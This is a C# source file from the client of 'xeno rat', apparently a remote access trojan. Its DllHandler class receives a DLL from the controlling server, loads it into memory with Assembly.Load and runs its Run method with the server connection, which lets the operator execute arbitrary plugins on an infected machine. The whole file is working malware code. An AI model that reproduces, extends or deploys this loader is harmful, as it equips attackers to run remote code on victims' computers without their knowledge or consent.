using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace xeno_rat_client
{
    class DllHandler
    {

        public DllHandler()
        {
            AppDomain.CurrentDomain.AssemblyResolve += CurrentDomain_AssemblyResolve;
        }

        private Dictionary<string, Assembly> Assemblies = new Dictionary<string, Assembly>();
        public string classpath = "Plugin.Main";
        public async Task DllNodeHandler(Node subServer)
        {
            byte[] getdll = new byte[] { 1 };
            byte[] hasdll = new byte[] { 0 };
            byte[] fail = new byte[] { 2 };
            byte[] success = new byte[] { 3 };
            try
            {
                byte[] name = await subServer.ReceiveAsync();
                string dllname = Encoding.UTF8.GetString(name);
                Console.WriteLine(dllname);
                if (!Assemblies.ContainsKey(dllname))
                {
                    await subServer.SendAsync(getdll);
                    byte[] dll_bytes = await subServer.ReceiveAsync();
                    Console.WriteLine(dll_bytes.Length);
                    Assemblies[dllname] = Assembly.Load(dll_bytes);
                }
                else
                {
                    await subServer.SendAsync(hasdll);
                }
                object ActivatedDll = Activator.CreateInstance(Assemblies[dllname].GetType(classpath));

                MethodInfo method = ActivatedDll.GetType().GetMethod("Run", BindingFlags.Instance | BindingFlags.Public);
                await (Task)method.Invoke(ActivatedDll, new object[] { subServer });
            }
            catch (Exception e)
            {
                await subServer.SendAsync(fail);
                await subServer.SendAsync(Encoding.UTF8.GetBytes(e.Message));
            }
        }
        private static Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
        {
            if (new AssemblyName(args.Name).Name == "xeno rat client")
            {
                return Assembly.GetExecutingAssembly();
            }
            return null;
        }
    }
}